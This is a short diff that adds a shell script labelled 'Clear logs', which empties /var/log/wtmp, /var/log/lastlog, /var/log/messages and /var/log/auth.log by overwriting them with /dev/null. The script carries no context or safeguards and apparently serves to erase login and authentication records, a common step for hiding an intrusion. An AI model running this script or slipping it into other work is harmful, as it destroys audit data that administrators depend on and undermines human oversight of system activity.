@@ -1,0 +1,6 @@
+#!/bin/sh
+
+# Clear logs
+for LOGFILE in /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/auth.log ; do
+    cat /dev/null > $LOGFILE
+done
